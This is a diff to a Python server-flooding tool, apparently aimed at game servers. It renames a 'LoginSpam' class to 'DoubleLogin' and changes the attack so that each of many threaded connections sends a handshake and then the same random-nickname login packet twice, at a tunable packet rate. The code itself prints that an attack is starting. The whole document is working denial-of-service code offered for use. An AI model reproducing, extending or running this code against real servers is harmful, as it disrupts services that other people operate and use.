@@ -1,14 +1,15 @@
 import random
-import string
 import socket
+import string
 import threading
 import time
 from multiprocessing.pool import ThreadPool
+
 from .handshake_packet import HandshakePacket
 from .login_packet import LoginPacket
 
 
-class LoginSpam:
+class DoubleLogin:
 
     def start_test(self):
         try:
@@ -17,8 +18,10 @@ class LoginSpam:
                 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 server.connect((self.address, self.port))
                 server.send(handshake_packet)
-                server.send(LoginPacket(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.
-                                                              digits) for _ in range(16))).get_packet())
+                nickname = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _
+                                   in range(16))
+                server.send(LoginPacket(nickname).get_packet())
+                server.send(LoginPacket(nickname).get_packet())
                 server.close()
                 self.packets += 1
                 if self.pps != -1 and self.pps > 0:
@@ -38,7 +41,7 @@ class LoginSpam:
         self.pps = pps
         self.protocol = protocol
         pool = ThreadPool(processes=threads)
-        print("Starting attack by login spam packet method")
+        print("Starting attack by double login packet method")
         for threads in range(threads):
             pool.apply_async(self.start_test)
         threading.Timer(duration, self.kill_timeout).start()
